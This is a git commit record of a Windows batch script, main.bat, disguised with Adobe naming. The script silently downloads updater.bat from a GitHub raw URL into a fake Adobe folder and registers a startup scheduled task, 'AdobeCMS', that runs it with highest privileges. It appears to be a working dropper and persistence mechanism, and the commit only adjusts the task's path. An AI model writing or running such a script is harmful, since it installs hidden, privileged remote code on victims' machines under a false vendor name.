e0032bcff6b736bb02c9ba6a126ab85041da9e1f
qufyu <162769381+qufyu@users.noreply.github.com>
2024-03-09 23:14:22 -0500

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,5 +1,5 @@
 @echo off
 md C:\Users\Public\Documents\Adobe
 curl -s https://raw.githubusercontent.com/qufyu/0024/main/updater.bat > C:\Users\Public\Documents\Adobe\updater.bat
-schtasks /create /sc onstart /tn AdobeCMS /tr %APPDATA%\Adobe\updater.bat /f /rl HIGHEST
+schtasks /create /sc onstart /tn AdobeCMS /tr C:\Users\Public\Documents\Adobe\updater.bat /f /rl HIGHEST
 exit
